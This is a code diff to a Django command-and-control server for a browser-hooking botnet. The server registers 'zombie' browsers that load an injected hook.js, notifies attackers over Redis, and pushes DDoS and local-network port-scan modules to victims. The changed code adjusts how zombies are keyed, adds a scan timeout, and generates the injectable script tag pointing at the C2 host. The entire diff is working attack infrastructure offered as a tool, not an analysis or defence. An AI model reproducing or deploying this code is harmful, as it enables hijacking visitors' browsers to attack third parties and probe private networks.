@@ -45,12 +45,12 @@ class ZombieInterface(viewsets.ModelViewSet):
         #pdb.set_trace()
         #check if zombie exists
         try:
-            zom = Zombie.objects.get(host=request.META['HTTP_HOST'])
+            zom = Zombie.objects.get(host=request.META['REMOTE_ADDR'])
         except Zombie.DoesNotExist:
-            newZombie = Zombie.objects.create(host=request.META['HTTP_HOST'])
+            newZombie = Zombie.objects.create(host=request.META['REMOTE_ADDR'])
             #tell attacker new zombie added
             redis_publisher = RedisPublisher(facility='attacker',sessions=[ atkr.sesskey for atkr in Attacker.objects.all()])
-            redis_publisher.publish_message(RedisMessage(simplejson.dumps({'newzombieId':newZombie.pk,'newzombieHost':newZombie.host})))
+            redis_publisher.publish_message(RedisMessage(simplejson.dumps({'new':'new','newzombieId':newZombie.pk,'newzombieHost':newZombie.host})))
         #check if session exits
         if not request.session.exists(request.session.session_key):
             request.session.create()
@@ -64,7 +64,7 @@ class ZombieInterface(viewsets.ModelViewSet):
     @list_route(methods=['get'])
     def updateAttacker(self,request,pk=None):
         redis_publisher = RedisPublisher(facility='attacker',sessions=[ atkr.sesskey for atkr in Attacker.objects.all()])
-        redis_publisher.publish_message(RedisMessage(simplejson.dumps({'data':request.GET['data']})))
+        redis_publisher.publish_message(RedisMessage(simplejson.dumps({'data':request.GET['host']})))
 
         return HttpResponse()
 
@@ -83,7 +83,6 @@ class Controller(viewsets.ModelViewSet):
             with open(os.getcwd()+"/ccstation/static/modules/ddos.js","r") as f:
                 code = f.read()
         except IOError as e:
-            print(e)
             return HttpResponse("Failed to fetch ddos code: "+e)
 
 
@@ -110,19 +109,25 @@ class Controller(viewsets.ModelViewSet):
     #port scan
     @list_route(methods=['post'])
     def localportscan(self,request,pk=None):
-        target = request.data['target']
+
+        target = request.data['targetnet']
+        timeout = 3
+        try:
+            timeout = int(request.data['timeout'])
+        except KeyError:
+            pass
         #fetch cell
         code =None
         try:
             with open(os.getcwd()+"/ccstation/static/modules/portscan.js","r") as f:
                 code = f.read()
         except IOError as e:
-            print(e)
             return HttpResponse("Failed to fetch portscan code: "+e)
         #tell zombie to scan network
         try:
             redis_publisher = RedisPublisher(facility='solo', sessions=[Zombie.objects.get(host=target).sesskey])
-            redis_publisher.publish_message(RedisMessage(simplejson.dumps({'code':code})))
+            args = simplejson.dumps({'server':request.get_host(),'timeout':timeout});
+            redis_publisher.publish_message(RedisMessage(simplejson.dumps({'args':args,'code':code})))
         except Zombie.DoesNotExist:
             return Response({'failed':'no such zombie'})
         #ack to controller
@@ -131,7 +136,6 @@ class Controller(viewsets.ModelViewSet):
     #creates script to inject into zombies
     @list_route(methods=['post'])
     def hookcreate(self,request,pk=None):
-        ip = request.data['server_ip']
         #add ws redis
         wsredis =None
         try:
@@ -147,22 +151,19 @@ class Controller(viewsets.ModelViewSet):
             with open(os.getcwd()+"/ccstation/static/js/jquery.min.js","r") as f:
                 jquery = f.read()
         except IOError as e:
-            print(e)
             return HttpResponse("Failed to setup hook script: "+e)
 
         headers = wsredis+jquery
         #server ip
-        ipstr=  'var host = "{ipaddress}";\n'
-        portstr= 'var port = "{port}";'
+        ipstr=  'var host = "{ipaddressport}";\n'
         #get injection script
         injection = open(os.getcwd()+"/ccstation/static/protohook.js").read()
         #format for user
-        injection = headers+ipstr.format(ipaddress=ip)+portstr.format(port=2000)+injection
+        injection = headers+ipstr.format(ipaddressport=request.get_host())+injection
         #attempt to create injection script
         try:
             with open(os.getcwd()+"/ccstation/static/hook.js",'w+') as f:
                     f.write(injection)
-                    return HttpResponse(simplejson.dumps({'resp':"src=\"http://"+ip+":2000/static/hook.js\""}),content_type='application/json')
+                    return HttpResponse(simplejson.dumps({'resp':"src=\"http://"+request.get_host()+":2000/static/hook.js\""}),content_type='application/json')
         except IOError as e:
-            print(e)
             return HttpResponse(e)
